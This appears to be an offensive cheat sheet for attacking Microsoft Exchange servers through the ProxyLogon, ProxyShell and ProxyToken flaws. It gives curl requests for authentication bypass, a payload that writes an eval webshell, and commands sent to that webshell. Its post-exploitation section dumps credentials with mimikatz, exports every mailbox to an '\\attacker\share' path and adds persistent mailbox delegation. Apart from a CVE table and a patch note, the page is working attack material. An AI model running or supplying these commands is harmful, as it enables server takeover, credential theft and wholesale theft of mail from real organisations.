# ProxyLogon / ProxyShell / ProxyToken

## ProxyLogon (CVE-2021-26855 + CVE-2021-27065) — Exchange 2013–2019

**Pre-auth SSRF → post-auth arbitrary file write → RCE**

```bash
# 1. Detect vulnerable endpoint
curl -sk https://exchange.com/owa/auth/x.js -v
# Vulnerable: returns 200 without redirect

# 2. Automated exploit (SSRF to dump credentials / write webshell)
python3 proxylogon.py -u https://exchange.com -e admin@domain.com

# 3. Manual SSRF — bypass authentication via cookie
# Cookie grants server-side SSRF to backend ECP (Exchange Control Panel)
curl -sk -X POST "https://exchange.com/owa/auth/x.js" \
  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;" \
  -H "X-ClientId: AAAA" \
  -H "X-EAS-SkipLoadBalancingKey: X" \
  -H "X-Back-End-Cookie: S=1"

# 4. After SSRF auth bypass: write ASPX webshell via SetObject OAB
curl -sk -X POST "https://exchange.com/ecp/DDI/DDIService.svc/SetObject" \
  -d '{"identity":{"__type":"Identity","DisplayName":"OAB (Default Web Site)","RawIdentity":"<GUID>"},"properties":{"Parameters":[{"__type":"Parameter","Name":"VirtualDirectoryName","Value":"OAB (Default Web Site)"},{"__type":"Parameter","Name":"ExternalUrl","Value":"http://f/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"cmd\"],\"unsafe\");}</script>"}]}}'
```

**Patched in**: March 2021 (KB5000871). Check version before attempting.

---

## ProxyShell (CVE-2021-34473 + 34523 + 31207) — Exchange 2013–2019

**Pre-auth path confusion → privilege escalation → arbitrary file write**

```bash
# 1. Detect — unauthenticated access to Autodiscover with path confusion
curl -sk -v "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com" \
  -H "Content-Type: application/mapi-http" \
  -H "X-RequestType: Bind"

# 2. Exploit — stage 1: get email address via EWS (unauthenticated via path confusion)
curl -sk "https://exchange.com/autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com" \
  -H "Cookie: X-BEResource=WIN-DC/EWS/Exchange.asmx?~3"

# 3. Full exploit script
python3 proxyshell.py -u https://exchange.com -e admin@domain.com
# Writes webshell to: /owa/auth/<random>.aspx
# Provides RCE as SYSTEM

# 4. Manual webshell request after exploit
curl -sk "https://exchange.com/owa/auth/shell.aspx" --data "cmd=whoami"
```

**Impact**: Unauthenticated RCE as SYSTEM on Exchange server (which typically has domain admin equivalent privileges).

---

## ProxyToken (CVE-2021-33766) — Exchange 2013–2019

**Authentication bypass via SecurityToken delegation**

```bash
# 1. Detect
python3 proxytoken.py -u https://exchange.com -e user@domain.com

# 2. Exploit — access EWS without valid credentials
curl -sk "https://exchange.com/ews/Exchange.asmx" \
  -H "X-ClientApplication: Test" \
  -H "Authorization: Basic dXNlcjpwYXNz"   # any base64 user:pass

# 3. Read target mailbox without real credentials
python3 proxytoken.py -u https://exchange.com -e victim@domain.com -a
# Dumps mailbox content
```

---

## Post-Exploitation After Exchange RCE

```powershell
# Exchange server usually = Domain Admin equivalent
# Dump credentials from Exchange service account
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Exchange has access to all mailboxes — dump everything
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
  New-MailboxExportRequest -Mailbox $_.Alias -FilePath "\\attacker\share\$($_.Alias).pst"
}

# Add mailbox delegate (persistent access without password)
Add-MailboxPermission -Identity victim@domain.com -User attacker@domain.com -AccessRights FullAccess
```

---

## CVE Quick Reference

| CVE | Type | Auth | Impact |
|-----|------|------|--------|
| CVE-2021-26855 | SSRF | Pre-auth | Backend auth bypass |
| CVE-2021-27065 | File write | Post-auth | Webshell → RCE |
| CVE-2021-34473 | Path confusion | Pre-auth | Auth bypass |
| CVE-2021-34523 | Privilege escalation | Post-auth | SYSTEM via Exchange |
| CVE-2021-31207 | File write | Post-auth | Webshell → RCE |
| CVE-2021-33766 | Auth bypass | Pre-auth | Mailbox access |
